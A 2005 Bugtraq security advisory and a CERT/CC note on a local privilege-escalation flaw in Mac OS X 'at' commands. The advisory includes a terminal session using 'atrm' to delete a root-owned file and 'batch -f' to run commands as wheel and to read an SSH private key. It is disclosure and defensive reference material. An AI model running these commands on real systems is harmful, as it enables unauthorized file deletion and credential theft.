=== Content from marc.info_8283e9b0_20250126_000400.html ===

```
[[prev in list](?l=bugtraq&m=110679184908018&w=2)] [[next in list](?l=bugtraq&m=110686104815385&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    DMA[2005-0127a] - 'Apple OSX batch family poor use of setuid'
From:       ["KF (Lists)" <kf_lists () digitalmunition ! com>](?a=110494924300003&r=1&w=2)
Date:       [2005-01-27 5:14:17](?l=bugtraq&r=1&w=2&b=200501)
Message-ID: [41F878A9.9030906 () digitalmunition ! com](?i=41F878A9.9030906%20()%20digitalmunition%20!%20com)
[Download RAW [message](?l=bugtraq&m=110685027017411&q=mbox) or [body](?l=bugtraq&m=110685027017411&q=raw)]

[["DMA[2005-0127a].txt" (text/plain)]](?l=bugtraq&m=110685027017411&q=p3)

DMA[2005-0127a] - 'Apple OSX batch family poor use of setuid'
Author: Kevin Finisterre
Vendor: <http://www.apple.com/macosx/>
Product: * at commands <= Mac OS X v10.3.7, Mac OS X Server v10.3.7

References: (CAN-2005-0125)
<http://www.digitalmunition.com/DMA>[2005-0127a].txt
<http://www.cve.mitre.org/cgi-bin/cvename.cgi?nameÊN-2005-0125>
<http://lists.apple.com/archives/security-announce/2005/Jan/msg00001.html>
<http://www.apple.com/support/downloads/securityupdate2005001macosx1028client.html>
<http://docs.info.apple.com/article.html?artnum00770>
<http://www.immunitysec.com/downloads/nukido.pdf>
<http://www.immunitysec.com/downloads/nukido.sxw>

Description:
Mac OS X v10.3 Panther offers breakthroughs in innovation and ease of use that won't
be seen in other operating systems for years, if ever, while its UNIX-based core
provides rock-solid security on the Internet.

On 1/25/2005 Apple published an advisory for the "at" commands to address a local
privilege escalation vulnerability. The "at" family of commands did not properly drop
privileges. This could allow a local user to remove files not owned by them, run programs
with added privileges, or read the contents of normally unreadable files. The update
patched the commands at, atrm, batch, atq, and atrun.

The following session outlines the behavior that was reported.

Please note that at, batch, atq, atrm are all disabled by default on Mac OS X.  Each
of these commands depend on the execution of atrun which has been disabled due to power
management concerns.  Those who would like to use these commands, must first re-enable
/usr/libexec/atrun by removing the leading '#' from the line
#*/5    *       *       *       *       root    /usr/libexec/atrun
in the file /etc/crontab.

'atrm' can be used to delete any file on the system. The atrm vulnerability does not
depend upon atrun.

CrunkJuice:~ kevinfinisterre$ id
uidP1(kevinfinisterre) gidP1(kevinfinisterre) groupsP1(kevinfinisterre),
79(appserverusr), 80(admin), 81(appserveradm)

CrunkJuice:~ kevinfinisterre$ rm /etc/hosts
override rw-r--r--  root/wheel for /etc/hosts? y
rm: /etc/hosts: Permission denied

CrunkJuice:~ kevinfinisterre$ ls -al /etc/hosts
-rw-r--r--  1 root  wheel  214  3 Dec 20:19 /etc/hosts

CrunkJuice:~ kevinfinisterre$ atrm /etc/hosts

CrunkJuice:~ kevinfinisterre$ ls -al /etc/hosts
ls: /etc/hosts: No such file or directory

'batch' can be used to execute commands as gid=0(wheel) groups=0(wheel), 1(daemon),
2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)

CrunkJuice:/tmp kevinfinisterre$ echo > aa
/usr/bin/id > /tmp/test

CrunkJuice:/tmp kevinfinisterre$ batch -f /tmp/aa 0
Job b0118490c.000 will be executed using /bin/sh

CrunkJuice:/tmp kevinfinisterre$ cat /tmp/test
cat: /tmp/test: No such file or directory

(wait 5 minutes)

CrunkJuice:/tmp kevinfinisterre$ cat /tmp/test
uidP1(kevinfinisterre) gid=0(wheel) groups=0(wheel), 1(daemon), 2(kmem), 3(sys),
 4(tty), 5(operator), 20(staff), 31(guest), 80(admin)

'batch' can also be used to read any file on the system.

CrunkJuice:~ kevinfinisterre$ cat /etc/ssh_host_dsa_key
cat: /etc/ssh_host_dsa_key: Permission denied

CrunkJuice:~ kevinfinisterre$ ls -al /etc/ssh_host_dsa_key
-rw-------  1 root  wheel  668 16 Nov 19:39 /etc/ssh_host_dsa_key

CrunkJuice:~ kevinfinisterre$ batch -f /etc/ssh_host_dsa_key
Job b011848db.000 will be executed using /bin/sh

CrunkJuice:~ kevinfinisterre$ ls -al /var/at/jobs/b011848db.000
-rwx------  1 kevinfin  wheel  1263  3 Dec 20:31 /var/at/jobs/b011848db.000

CrunkJuice:~ kevinfinisterre$ cat /var/at/jobs/b011848db.000
#! /bin/sh
# mail     root 0
umask 22
TERM_PROGRAM=Apple\_Terminal; export TERM_PROGRAM
SHELL=\/bin\/bash; export SHELL
TERM_PROGRAM_VERSION0; export TERM_PROGRAM_VERSION
OLDPWD=\/var\/at\/jobs; export OLDPWD
USER=kevinfinisterre; export USER
__CF_USER_TEXT_ENCODING=0x1F5\:0\:0; export __CF_USER_TEXT_ENCODING
PATH=\/bin\:\/sbin\:\/usr\/bin\:\/usr\/sbin; export PATH
PWD=\/Users\/kevinfinisterre; export PWD
SHLVL=1; export SHLVL
HOME=\/Users\/kevinfinisterre; export HOME
LOGNAME=kevinfinisterre; export LOGNAME
SECURITYSESSIONID ee50; export SECURITYSESSIONID
cd /Users/kevinfinisterre
-----BEGIN DSA PRIVATE KEY-----
ascsefmwe;lijweio;fj23n8r01ur9wefskljvnsdlvsd;kvcms;dkmcv;sdklvm
dfbkldfmbdfp0bjerpgjwglvksdmvw430vgwevklmsdkvmasdvnqwefh3bnjnsek
6513515641w6egf4e65v4s6v54we65f4ae6f464b6464b6w4bw6e4bvgw6evgf4w
sdvsdfbgfgbndfdfvbsdfvsd5v46se8f4634f6w3f4q3f4sd35vf4sd3v4sd3v4s
ascsefmwe;lijweio;fj23n8r01ur9wefskljvnsdlvsd;kvcms;dkmcv;sdklvm
dfbkldfmbdfp0bjerpgjwglvksdmvw430vgwevklmsdkvmasdvnqwefh3bnjnsek
6513515641w6egf4e65v4s6v54we65f4ae6f464b6464b6w4bw6e4bvgw6evgf4w
sdvsdfbgfgbndfdfvbsdfvsd5v46se8f4634f6w3f4q3f4sd35vf4sd3v4sd3v4s
ereethamstahenkryption
-----END DSA PRIVATE KEY-----

Apple has released patches for this vulnerability, please see the
references above.

For the protection of its customers, Apple does not disclose, discuss,
or confirm security issues until a full investigation has occurred and
any necessary patches or releases are available. Apple likes to focus
response efforts so that they have the greatest impact across
the product line, because of this they generally will not respond to
e-mail messages unless further information is needed for a security
issue.

This is timeline associated with this bug.

12/20/2004 02:22 PM - initial response
01/03/2005 09:17 PM - followup
01/12/2005 02:56 PM - ...
01/13/2005 08:41 PM - ...
01/19/2005 12:16 AM - confirm credit
01/20/2005 12:13 PM - immunitysec nukido release

-KF

[[prev in list](?l=bugtraq&m=110679184908018&w=2)] [[next in list](?l=bugtraq&m=110686104815385&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.kb.cert.org_a02872a3_20250126_000402.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#678150

## Apple Mac OS X "at" utilities fail to drop privileges properly

#### Vulnerability Note VU#678150

Original Release Date: 2005-01-27 | Last Revised: 2005-01-28

---

### Overview

Apple's Mac OS X operating system may allow local privilege escalation in family of "at" commands.

### Description

| Mac OS X includes the "at" family of commands in order to schedule tasks. However, a flaw in these commands results in the commands not dropping privileges correctly. This may allow a malicious local user to run commands with additional privileges, read or remove protected files, or gain other unintended access.  The affected commands include: at, atq, atrm, atrun, and batch. |
| --- |

### Impact

| These commands are disabled by default in Mac OS X. If they have been enabled, a malicious local user may gain additional privileges including the ability to remove or read protected files, or run programs with additional privileges. |
| --- |

### Solution

| **Apply a patch**Apple advises all users to apply [Apple Security Update 2005-001](http://docs.info.apple.com/article.html?artnum=300770), as it fixes this flaw and other critical security flaws. |
| --- |

### Vendor Information

678150
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23678150/) to view vendors.**
### [Apple Computer Inc.](#KMIS-692UF5) Affected

Updated:  January 27, 2005

### Status

Affected

### Vendor Statement

Please see the following link for the statement from Apple Computer Inc.:

<<http://docs.info.apple.com/article.html?artnum=300770>>

### Vendor Information

The vendor has not provided us with any further information regarding this vulnerability.

### Addendum

US-CERT has no additional comments at this time.

If you have feedback, comments, or additional information about this vulnerability, please send us email.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 0 | AV:--/AC:--/Au:--/C:--/I:--/A:-- |
| Temporal | 0 | E:ND/RL:ND/RC:ND |
| Environmental | 0 | CDP:ND/TD:ND/CR:ND/IR:ND/AR:ND |

### References

* <http://docs.info.apple.com/article.html?artnum=300770>
* <http://lists.apple.com/archives/security-announce/2005/Jan/msg00001.html>
* <http://secunia.com/advisories/14005/>
* <http://www.immunitysec.com/resources-advisories.shtml>
* <http://www.immunitysec.com/downloads/nukido.pdf>
### Acknowledgements

Thanks to Apple Product Security for reporting this vulnerability. Apple in turn thanks Kevin Finisterre of Immunity, Inc. for reporting this vulnerability.

This document was written by Ken MacInnis.

### Other Information

| **CVE IDs:** | [CVE-2005-0125](http://web.nvd.nist.gov/vuln/detail/CVE-2005-0125) |
| --- | --- |
| **Severity Metric:** | 8.10 |
| **Date Public:** | 2005-01-18 |
| **Date First Published:** | 2005-01-27 |
| **Date Last Updated:** | 2005-01-28 15:55 UTC |
| **Document Revision:** | 15 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800


